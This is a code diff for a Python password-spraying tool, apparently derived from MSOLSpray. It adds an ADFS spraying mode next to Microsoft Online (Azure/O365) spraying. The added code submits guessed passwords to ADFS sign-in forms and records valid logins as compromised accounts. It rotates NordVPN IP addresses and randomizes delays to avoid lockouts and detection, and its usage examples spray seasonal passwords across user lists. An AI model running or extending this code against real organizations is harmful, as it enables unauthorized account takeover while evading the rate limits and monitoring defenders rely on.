@@ -1,29 +1,31 @@
 import requests
 import argparse
+import urllib
+import urllib.parse
 import time
 import datetime
 import sys
 from nordvpn_switcher import initialize_VPN,terminate_VPN
 from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
+from requests.packages.urllib3.exceptions import TimeoutError
+from requests_ntlm import HttpNtlmAuth
 
 def args_parse():
     description = """
-    This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
-
-    This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
+    This script will perform password spraying against Microsoft Online accounts (Azure/O365) or ADFS.
+    For MSOL :  The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
     """
 
     epilog = """
     EXAMPLE USAGE:
     This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
-        python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020
-
-    This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
-        python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --target https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
+    python3 VPNspray.py -U users.txt -r 1 5 -p 'Winter2020*' --skip-tested --ignore-success --vpn --vpn-area "France,Germany,Netherlands,United Kingdom" msol
+    python3 VPNspray.py -U users.txt -s 3 -p 'Winter2020*' -t https://adfs.example.com --skip-tested --ignore-success --vpn --vpn-area "France" adfs
     """
     parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
     pass_group = parser.add_mutually_exclusive_group(required=True)
     user_group = parser.add_mutually_exclusive_group(required=True)
+    target_group = parser.add_mutually_exclusive_group(required=False)
     sleep_group = parser.add_mutually_exclusive_group(required=False)
     user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
     user_group.add_argument('-u', '--user', help="Single email to test")
@@ -32,13 +34,15 @@ def args_parse():
     pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
     sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
     sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
-    parser.add_argument('-t', '--target', default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
+    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
+    target_group.add_argument('-t', '--target', help="Target server to authenticate against")
     parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
     parser.add_argument("-f", "--force", action=argparse.BooleanOptionalAction, help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
     parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
     parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
+    parser.add_argument('method', choices=['adfs', 'msol'])
     return parser.parse_args()
 
 def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass, force):
@@ -188,13 +192,107 @@ def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, 
     LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
 
 
+def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass):
+    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
+    username_counter = 0
+    prev_ip = initial_ip
+    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)
+
+    try:
+        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
+        for target in targets:  # checking each target separately
+            for username in usernames:
+                if (userAsPass):
+                        passwords = [username.split('@')[0]]
+                for password in passwords:  # trying one password against each user, less likely to lockout users
+                    if ignore_success:
+                        try:
+                            already = has_user_been_pwned(username)
+                        except Exception as e:
+                            LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
+                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
+                        if already:
+                            LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
+                            continue
+                    
+                    if skip_tested:
+                        try:
+                            already = has_user_password_been_tested(username, password)
+                        except Exception as e:
+                            LOGGER.warning(f"[DB] Error during the user:password check: {e}")
+                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
+                        if already:
+                            LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
+                            continue  # passe au suivant
+
+                    if vpn and username_counter % 15 == 0:
+                        new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
+                        if new_ip:
+                            prev_ip = new_ip
+                            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
+                        else:
+                            LOGGER.warning("[VPN] Rotation failed — exiting")
+                            sys.exit(1)
+
+                    ip = get_public_ip(timeout=5, retries=2)
+
+                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
+                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
+                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
+                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
+                    session = make_session(random_ua=True)
+                    session.auth = (username, password)
+                    
+                    try:
+                        response = session.post(target_url, data=post_data, allow_redirects=False,
+                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
+                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
+                                                               'image/webp,*/*;q=0.8'})
+                        sent_headers = response.request.headers
+                        LOGGER.debug(f"Sent headers: {sent_headers}")
+                        status_code = response.status_code
+                        #  Currently checking only if working or not, need to add more tests in the future
+
+                        if status_code == 302:
+                            log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
+                            working_creds_counter += 1
+                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
+                        else:
+                            log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
+                            LOGGER.error("[-]Creds failed for: %s" % username)
+                        session.close()
+                    except requests.exceptions.RequestException as e:
+                        LOGGER.warning(f"Request failed for {username}@{target_url}: {e}")
+                    
+                    if random is True:  # let's wait between attempts
+                        sleep_time = random_time(min_sleep, max_sleep)
+                        time.sleep(float(sleep_time))
+                    else:
+                        time.sleep(float(sleep_time))
+                    username_counter += 1
+                    LOGGER.info(f"{username_counter} of {total_attempts} users tested")
+
+        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
+        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
+
+    except TimeoutError:
+        LOGGER.critical("[!] Timeout! check if target is accessible")
+        pass
+
+    except KeyboardInterrupt:
+        LOGGER.critical("[CTRL+C] Stopping the tool")
+        exit(1)
+
+    except Exception as e:
+        excptn(e)
+
 def main():
     args = args_parse()
     random = False
     min_sleep, max_sleep = 0, 0
     usernames, passwords, targets = [], [], []
     global LOGGER
-    LOGGER = configure_logger(args.verbose, "MSOL")
+    LOGGER = configure_logger(args.verbose, "LOG")
     init_db("events.db")
 
     if args.userlist:
@@ -229,6 +327,11 @@ def main():
             targets = targetlist(args.targetlist)
         except Exception as err:
             excptn(err)
+    elif args.method == 'adfs' and not (args.target or args.targetlist):
+        LOGGER.error("ADFS method needs at least one target. Exiting.")
+        sys.exit(1)
+    elif args.method == 'msol' and not (args.target or args.targetlist):
+        targets = ["https://login.microsoft.com"]
 
     total_accounts = len(usernames)
     total_passwords = len(usernames if args.userAsPass else passwords)
@@ -238,7 +341,6 @@ def main():
     LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
     LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
     LOGGER.info("Total number of attempts: %s" % str(total_attempts))
-    LOGGER.info("Now spraying Microsoft Online.")
     LOGGER.info(f"Current date and time: {time.ctime()}")
 
     initial_ip = get_public_ip(timeout=5, retries=2)
@@ -268,8 +370,16 @@ def main():
         min_sleep = args.random[0]
         max_sleep = args.random[1]
 
-    msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
+    if args.method == 'adfs':
+        LOGGER.info("Now spraying ADFS.")
+        adfs_attempts(usernames, passwords, targets,
+                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
+    elif args.method =='msol':
+        LOGGER.info("Now spraying Microsoft Online.")
+        msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
                   args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)
+    else:
+        LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")
 
     if args.vpn:
         terminate_VPN()
